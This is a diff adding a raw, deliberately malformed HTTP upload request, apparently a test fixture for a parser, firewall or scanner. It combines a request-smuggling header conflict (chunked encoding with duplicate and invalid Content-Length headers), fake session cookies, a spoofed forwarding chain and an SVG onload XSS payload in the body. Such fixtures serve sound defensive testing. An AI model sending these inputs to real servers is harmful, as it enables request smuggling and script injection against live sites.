@@ -1,0 +1,16 @@
+POST /api/upload HTTP/1.1
+Host: vulnerable.example.com
+User-Agent: EvilScanner/1.0
+Transfer-Encoding: chunked
+Content-Length: abc
+Content-Length: 100
+X-Forwarded-For: 10.0.0.1, 10.0.0.2
+Cookie: sessionid=attack123; csrftoken=badtoken
+Accept: */*
+Accept-Language: en-US
+Connection: keep-alive
+Content-Type: multipart/form-data; boundary=---------------------------d74496d66958873e
+
+b0
+<svg/onload=alert('xss')>
+0
